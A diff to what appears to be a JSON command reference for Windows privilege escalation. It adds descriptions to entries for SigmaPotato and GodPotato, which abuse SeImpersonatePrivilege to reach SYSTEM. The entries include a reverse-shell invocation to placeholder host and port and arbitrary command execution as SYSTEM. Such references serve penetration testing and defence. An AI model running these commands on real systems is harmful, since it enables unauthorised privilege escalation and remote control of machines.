@@ -72,17 +72,20 @@
     {
       "command": ".\\SigmaPotato.exe --revshell <lhost> <lport>",
       "caption": "SigmaPotato: modern SeImpersonate exploit, works on Server 2019/2022 and Win10/11",
-      "label": "SigmaPotato - reverse shell"
+      "label": "SigmaPotato - reverse shell",
+      "description": "SigmaPotato - reverse shell. See the command syntax for exact parameters and flags."
     },
     {
       "command": ".\\SigmaPotato.exe \"<command>\"",
       "caption": "SigmaPotato: run arbitrary command as SYSTEM",
-      "label": "SigmaPotato - run a command"
+      "label": "SigmaPotato - run a command",
+      "description": "SigmaPotato - run a command. See the command syntax for exact parameters and flags."
     },
     {
       "command": ".\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
       "caption": "GodPotato: alternative for latest Windows/Server (2019+)",
-      "label": ".\\GodPotato-NET4.exe"
+      "label": ".\\GodPotato-NET4.exe",
+      "description": "Exploits the GodPotato vulnerability for local privilege escalation from service accounts with SeImpersonatePrivilege. Elevates from a service context to SYSTEM."
     }
   ],
   "defense": {
